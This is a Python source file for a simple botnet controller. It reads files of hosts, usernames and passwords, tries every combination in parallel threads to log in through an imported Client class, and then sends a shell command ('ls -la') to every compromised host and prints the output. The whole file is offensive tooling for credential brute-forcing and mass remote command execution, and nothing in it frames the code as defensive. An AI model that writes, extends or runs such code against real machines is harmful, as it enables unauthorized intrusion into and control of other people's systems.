from threading import Thread

from client import Client


class Botnet:
    def __init__(self):
        self.botnet = []

    def add_client(self, host, user, password):
        client = Client(host, user, password)
        self.botnet.append(client)

    def botnet_command(self, command):
        for client in self.botnet:
            output = client.send_command(command)
            if output:
                print("[*] Output from host: " + client.host + " and user: " + client.user)
                print("[+] ", output.decode("utf-8").strip())

    def read_hosts(self, file):
        with open(file, 'r') as f:
            hosts = [line.strip() for line in f.readlines()]
        return hosts

    def read_users(self, file):
        with open(file, 'r') as f:
            users = [line.strip() for line in f.readlines()]
        return users

    def read_passwords(self, file):
        with open(file, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
        return passwords

    def start(self, file_hosts, file_users, file_passwords):
        hosts = self.read_hosts(file_hosts)
        users = self.read_users(file_users)
        passwords = self.read_passwords(file_passwords)

        threads = []
        for h in hosts:
            print(h)
            for u in users:
                print("  " + u)
                for p in passwords:
                    print("    " + p)
                    thread = Thread(target=self.add_client, args=(h, u, p,))
                    thread.start()
                    threads.append(thread)

        [t.join() for t in threads]
        self.botnet_command("ls -la")